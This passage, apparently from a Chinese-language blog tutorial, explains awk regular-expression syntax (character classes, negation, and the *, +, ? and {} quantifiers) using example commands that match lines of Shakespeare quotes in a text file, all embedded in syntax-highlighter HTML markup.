class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ awk '/^Th[ie]/{print $0}' poetry.txt\r\nThis above all: to thine self be true\r\nThere is nothing either good or bad, but thinking makes it so\r\nThere’s a special providence in the fall of a sparrow</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bd11b2afe7914550301-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd11b2afe7914550301-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594bd11b2afe7914550301-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd11b2afe7914550301-4\">4</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bd11b2afe7914550301-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">awk</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'/^Th[ie]/{print $0}'</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">poetry</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">txt</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd11b2afe7914550301-2\"><span class=\"crayon-r\">This</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">above </span><span class=\"crayon-v\">all</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">to</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">thine </span><span class=\"crayon-r\">self</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">be </span><span class=\"crayon-t\">true</span></div><div class=\"crayon-line\" id=\"crayon-594bd11b2afe7914550301-3\"><span class=\"crayon-e\">There </span><span class=\"crayon-st\">is</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">nothing </span><span class=\"crayon-e\">either </span><span class=\"crayon-e\">good </span><span class=\"crayon-st\">or</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">bad</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">but </span><span class=\"crayon-e\">thinking </span><span class=\"crayon-e\">makes </span><span class=\"crayon-e\">it </span><span class=\"crayon-e\">so</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd11b2afe7914550301-4\"><span class=\"crayon-i\">There</span>’<span class=\"crayon-i\">s</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">special </span><span class=\"crayon-e\">providence </span><span class=\"crayon-st\">in</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">the </span><span class=\"crayon-e\">fall </span><span class=\"crayon-i\">of</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">sparrow</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0013 seconds] -->\r\n<p>这个例子中的正则表达式 <code>/^Th[ie]/</code>表示匹配以字符串 “Thi” 或者 “The” 开头的行，正则表达式方括号中表示匹配其中的任意单个字符。</p>\n<p><strong>再继续上面的新的用法</strong></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bd11b2afeb628566519\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ awk '/s[a-z]/{print $0}' poetry.txt\r\nThis above all: to thine self be true\r\nThere is nothing either good or bad, but thinking makes it so\r\nThere’s a special providence in the fall of a sparrow</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bd11b2afeb628566519-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd11b2afeb628566519-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594bd11b2afeb628566519-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd11b2afeb628566519-4\">4</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bd11b2afeb628566519-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">awk</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'/s[a-z]/{print $0}'</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">poetry</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">txt</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd11b2afeb628566519-2\"><span class=\"crayon-r\">This</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">above </span><span class=\"crayon-v\">all</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">to</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">thine </span><span class=\"crayon-r\">self</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">be </span><span class=\"crayon-t\">true</span></div><div class=\"crayon-line\" id=\"crayon-594bd11b2afeb628566519-3\"><span class=\"crayon-e\">There </span><span class=\"crayon-st\">is</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">nothing </span><span class=\"crayon-e\">either </span><span class=\"crayon-e\">good </span><span class=\"crayon-st\">or</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">bad</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">but </span><span class=\"crayon-e\">thinking </span><span class=\"crayon-e\">makes </span><span class=\"crayon-e\">it </span><span class=\"crayon-e\">so</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd11b2afeb628566519-4\"><span class=\"crayon-i\">There</span>’<span class=\"crayon-i\">s</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">special </span><span class=\"crayon-e\">providence </span><span class=\"crayon-st\">in</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">the </span><span class=\"crayon-e\">fall </span><span class=\"crayon-i\">of</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">sparrow</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0013 seconds] -->\r\n<p>正则表达式 <code>/s[a-z]/</code> 表示匹配包含字符 s 然后后面跟着任意 a 到 z 之间的单个字符的字符串，比如 “se”, “so”, “sp” 等等。</p>\n<p><strong>正则表达式 <code>[]</code> 方括号中还有一些其他用法比如下面这些</strong></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bd11b2afee546825891\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n[a-zA-Z]  表示匹配小写的 a 到 z 之间的单个字符，或者大写的 A 到 Z 之间的单个字符\r\n[^a-z]    符号 `^` 在方括号里面表示取反，也就是非的意思，表示匹配任何非 a 到 z 之间的单个字符</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bd11b2afee546825891-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd11b2afee546825891-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bd11b2afee546825891-1\"><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">a</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">zA</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">Z</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\">  </span>表示匹配小写的<span class=\"crayon-h\"> </span><span class=\"crayon-i\">a</span><span class=\"crayon-h\"> </span>到<span class=\"crayon-h\"> </span><span class=\"crayon-i\">z</span><span class=\"crayon-h\"> </span>之间的单个字符，或者大写的<span class=\"crayon-h\"> </span><span class=\"crayon-i\">A</span><span class=\"crayon-h\"> </span>到<span class=\"crayon-h\"> </span><span class=\"crayon-i\">Z</span><span class=\"crayon-h\"> </span>之间的单个字符</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd11b2afee546825891-2\"><span class=\"crayon-sy\">[</span><span class=\"crayon-o\">^</span><span class=\"crayon-v\">a</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">z</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\">    </span>符号<span class=\"crayon-h\"> </span><span class=\"crayon-sy\">`</span><span class=\"crayon-o\">^</span><span class=\"crayon-sy\">`</span><span class=\"crayon-h\"> </span>在方括号里面表示取反，也就是非的意思，表示匹配任何非<span class=\"crayon-h\"> </span><span class=\"crayon-i\">a</span><span class=\"crayon-h\"> </span>到<span class=\"crayon-h\"> </span><span class=\"crayon-i\">z</span><span class=\"crayon-h\"> </span>之间的单个字符</div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0015 seconds] -->\r\n<p><strong>正则表达式中的星号 <code>*</code> 和加号 <code>+</code> 的使用方法</strong></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bd11b2aff7591478714\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ awk '/go*d/{print $0}' poetry.txt\r\nThere is nothing either good or bad, but thinking makes it so</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bd11b2aff7591478714-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd11b2aff7591478714-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bd11b2aff7591478714-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">awk</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'/go*d/{print $0}'</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">poetry</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">txt</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd11b2aff7591478714-2\"><span class=\"crayon-e\">There </span><span class=\"crayon-st\">is</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">nothing </span><span class=\"crayon-e\">either </span><span class=\"crayon-e\">good </span><span class=\"crayon-st\">or</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">bad</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">but </span><span class=\"crayon-e\">thinking </span><span class=\"crayon-e\">makes </span><span class=\"crayon-e\">it </span><span class=\"crayon-v\">so</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0007 seconds] -->\r\n<p>上面这个表示匹配包含字符串 “god”，并且中间的字母 “o” 可以出现 0 次或者多次，比如单词 “good” 就符合这个要求。 正则表达式中的 <code>+</code> 和星号原理差不多，只是加号表示任意 1 个或者 1 个以上，也就是必须至少要出现一次。</p>\n<p><strong>正则表达式问号 ? 的使用方法</strong></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bd11b2affb378461619\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ awk '/ba?d/{print $0}' poetry.txt\r\nThere is nothing either good or bad, but thinking makes it so</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bd11b2affb378461619-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd11b2affb378461619-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bd11b2affb378461619-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">awk</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'/ba?d/{print $0}'</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">poetry</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">txt</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd11b2affb378461619-2\"><span class=\"crayon-e\">There </span><span class=\"crayon-st\">is</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">nothing </span><span class=\"crayon-e\">either </span><span class=\"crayon-e\">good </span><span class=\"crayon-st\">or</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">bad</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">but </span><span class=\"crayon-e\">thinking </span><span class=\"crayon-e\">makes </span><span class=\"crayon-e\">it </span><span class=\"crayon-v\">so</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0008 seconds] -->\r\n<p>正则表达式中的问号 ? 表示它前面的字符只能出现 0 次 或者 1 次，也就是可以不出现，也可以出现，但如果有出现也只能出现 1 次。</p>\n<p><strong>正则表达式中的 {} 花括号用法</strong></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bd11b2affe299180105\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ awk '/go{2}d/{print $0}' poetry.txt\r\nThere is nothing either good or bad, but thinking makes it so</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bd11b2affe299180105-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd11b2affe299180105-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bd11b2affe299180105-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">awk</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'/go{2}d/{print $0}'</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">poetry</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">txt</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd11b2affe299180105-2\"><span class=\"crayon-e\">There </span><span class=\"crayon-st\">is</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">nothing </span><span class=\"crayon-e\">either </span><span class=\"crayon-e\">good </span><span class=\"crayon-st\">or</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">bad</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">but </span><span class=\"crayon-e\">thinking </span><span class=\"crayon-e\">makes </span><span class=\"crayon-e\">it </span><span class=\"crayon-v\">so</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0007 seconds] -->\r\n<p>花括号 <code>{}</code> 表示规定它前面的字符必须出现的次数，像上面这个 <code>/go{2}d/</code> 就表示只匹配字符串 “good”，也就是中间的字母 “o” 必须要出现 2 次。</p>\n<p><strong>正则表达式中的花括号还有一些其他的用法如下</strong></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bd11b2b001066727576\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n/go{2,3}d/    表示字母 \"o\" 只能可以出现 2 次或者 3 次\r\n/go{2,10}d/   表示字母 \"o\" 只能可以出现 2次，3次，4次，5次，6次 ... 一直到 10 次\r\n/go{2,}d/     表示字母 \"o\" 必须至少出现 2 次或着 2 次以上</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bd11b2b001066727576-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd11b2b001066727576-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594bd11b2b001066727576-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bd11b2b001066727576-1\"><span class=\"crayon-o\">/</span><span class=\"crayon-e\">go</span><span class=\"crayon-sy\">{</span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">,</span><span class=\"crayon-cn\">3</span><span 